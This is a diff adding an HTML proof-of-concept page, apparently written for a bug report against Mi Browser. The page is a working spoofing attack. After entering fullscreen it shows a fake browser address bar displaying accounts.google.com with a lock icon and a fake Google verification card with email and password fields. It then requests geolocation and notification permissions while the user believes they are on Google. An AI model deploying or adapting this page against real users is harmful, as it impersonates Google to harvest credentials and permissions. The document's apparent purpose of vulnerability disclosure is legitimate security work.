@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>PoC: Mi Browser Fullscreen Spoof - Final Report</title>
+<style>
+  body { background:#0a0a0a; color:white; font-family: sans-serif; margin:0; overflow:hidden; }
+  #start-screen { height:100vh; display:flex; flex-direction:column; align-items:center; justify-content:center; text-align:center; padding:20px; }
+  #attack-screen { display:none; position:fixed; inset:0; background:#000; z-index:9999; flex-direction:column; }
+  /* Fake Omnibox - ini yang di-spoof */
+  .fake-omnibox { background:#202124; padding:10px 16px; display:flex; align-items:center; gap:8px; border-bottom:1px solid #333; }
+  .fake-omnibox .lock { color:#8ab4f8; }
+  .fake-omnibox .url { color:#e8eaed; font-size:13px; white-space:nowrap; overflow:hidden; text-overflow:ellipsis; }
+  /* Konten palsu di tengah - INI YANG BISA DIKLIK */
+  .fake-content { flex:1; display:flex; align-items:center; justify-content:center; background:#121212; pointer-events:auto; }
+  .card { background:#1e1e1e; border:1px solid #333; border-radius:12px; padding:24px; width:90%; max-width:340px; pointer-events:auto; }
+  .card h2 { margin:0 0 10px 0; font-size:18px; }
+  .card p { color:#9aa0a6; font-size:13px; margin-bottom:16px; }
+  .card input { width:100%; background:#2d2e30; border:1px solid #5f6368; color:white; padding:12px; border-radius:8px; margin-bottom:12px; box-sizing:border-box; }
+  .card button { width:100%; background:#8ab4f8; color:#202124; border:0; padding:12px; border-radius:8px; font-weight:bold; }
+  #log { position:fixed; bottom:0; left:0; right:0; background:rgba(0,0,0,0.9); font-family:monospace; font-size:11px; padding:8px; max-height:120px; overflow:auto; border-top:1px solid #333; }
+  #start-btn { background:#2962ff; color:white; border:0; padding:16px 32px; border-radius:12px; font-size:16px; font-weight:bold; }
+</style>
+</head>
+<body>
+
+<div id="start-screen">
+  <h1>PoC: Fullscreen + Permission Confusion</h1>
+  <p style="color:#9aa0a6; max-width:400px;">Kombinasi: Fullscreen Spoof + Fake Omnibox + Geolocation<br>Target: Mi Browser (Chromium)</p>
+  <p style="color:#fbbc04; font-size:12px;">LOG: ready<br>If no 'Exit fullscreen' warning with origin = bug spoofing</p>
+  <br>
+  <button id="start-btn">▶ Start Combined Attack</button>
+</div>
+
+<div id="attack-screen">
+  <div class="fake-omnibox">
+    <span style="color:#34a853;">● ● ●</span>
+    <span class="lock">🔒</span>
+    <span class="url">https://accounts.google.com/signin/v2/challenge</span>
+    <span style="margin-left:auto;">⋮</span>
+  </div>
+  <div class="fake-content">
+    <div class="card">
+      <h2><span style="color:#4285f4;">G</span><span style="color:#ea4335;">o</span><span style="color:#fbbc04;">o</span><span style="color:#4285f4;">g</span><span style="color:#34a853;">l</span><span style="color:#ea4335;">e</span> - Secure Verification Required</h2>
+      <p>Verify your location to continue<br><span style="font-size:11px; color:#5f6368;">Origin asli seharusnya: bonex1927.github.io</span></p>
+      <input type="text" id="email" placeholder="victim@gmail.com" value="victim@gmail.com">
+      <input type="password" placeholder="••••••••">
+      <button onclick="triggerGeo()">Verify & Continue</button>
+      <p id="geo-result" style="margin-top:12px; font-size:11px; color:#fbbc04;"></p>
+    </div>
+  </div>
+  <div id="log"></div>
+</div>
+
+<script>
+const logEl = document.getElementById('log');
+function addLog(msg){
+  const d = document.createElement('div');
+  d.textContent = 'LOG: ' + msg + ' - ' + new Date().toLocaleTimeString();
+  logEl.prepend(d);
+}
+addLog('ready');
+
+document.getElementById('start-btn').addEventListener('click', async () => {
+  addLog('1. Requesting fullscreen...');
+  try {
+    await document.documentElement.requestFullscreen();
+    addLog('1b. Fullscreen entered - check if exit warning shows origin!');
+  } catch(e){ addLog('Fullscreen failed: '+e); }
+  
+  document.getElementById('start-screen').style.display='none';
+  document.getElementById('attack-screen').style.display='flex';
+  
+  addLog('2. Fake omnibox shown: accounts.google.com');
+  addLog('3. Page is trapped - outer UI cannot be scrolled (intentional)');
+  addLog('3b. BUT inner fake login IS interactable (pointer-events:auto) - phishing impact');
+  
+  // Auto trigger geo after 1 sec to simulate combined attack
+  setTimeout(()=>{ triggerGeo(); }, 1000);
+});
+
+function triggerGeo(){
+  addLog('3. Triggering geolocation inside spoofed UI...');
+  document.getElementById('geo-result').textContent = 'Meminta akses lokasi...';
+  
+  if(!navigator.geolocation){
+    addLog('Geolocation not supported');
+    return;
+  }
+  
+  navigator.geolocation.getCurrentPosition(
+    (pos)=>{
+      addLog('Geolocation: SUCCESS - lat:'+pos.coords.latitude.toFixed(2));
+      document.getElementById('geo-result').textContent = 'Lokasi didapat: '+pos.coords.latitude.toFixed(4)+', '+pos.coords.longitude.toFixed(4)+' (Seharusnya user tahu ini diminta oleh github.io, bukan google.com)';
+    },
+    (err)=>{
+      addLog('Geolocation: User denied / Blocked - Code:'+err.code);
+      document.getElementById('geo-result').textContent = 'Akses lokasi ditolak / diblokir tanpa prompt origin yang jelas (Bug: Permission Confusion). Code: '+err.code;
+    }
+  );
+  
+  // Also trigger Notification request for combined impact
+  if('Notification' in window && Notification.permission === 'default'){
+    addLog('4. Triggering Notification permission inside spoofed UI...');
+    Notification.requestPermission().then(p=> addLog('Notification permission: '+p));
+  }
+}
+
+// Keluar fullscreen saat back
+document.addEventListener('fullscreenchange', ()=>{
+  if(!document.fullscreenElement){
+    addLog('Exited fullscreen');
+    document.getElementById('attack-screen').style.display='none';
+    document.getElementById('start-screen').style.display='flex';
+  }
+});
+</script>
+</body>
+</html>
